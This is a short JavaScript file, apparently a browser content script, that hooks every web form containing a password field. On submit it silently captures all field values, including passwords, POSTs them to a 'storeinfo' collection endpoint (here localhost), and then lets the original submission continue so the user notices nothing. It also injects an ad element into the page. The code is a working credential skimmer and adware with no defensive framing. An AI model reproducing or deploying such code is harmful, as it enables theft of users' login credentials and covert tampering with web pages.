'use strict';
$(document).ready(function() {
    var allPageForms = $('form');
    var passPageForms = [];
    _.each(allPageForms, function(form) {
        var passInput = $(form).find('input[type=password]');
        var formSubmited = false;
        if(passInput.length > 0) {
            $(form).on('submit', function(e){
                if(formSubmited) return;
                e.stopPropagation();
                e.preventDefault();
                var data = _.object($(form).serializeArray().map(function(v) {return [v.name, v.value];} ));
                formSubmited = true;
                $.post('https://localhost/storeinfo', data, function(res){
                    $(form).submit();
                    console.log(res);
                }).error(function() {
                    console.log('error submiting info');
                    $(form).submit();
                });
            });
            passPageForms.push(form);
        }
    });

    var el = $('<div class="my_ad">');
    el.text('This is sparta');
    $('body').append(el);
});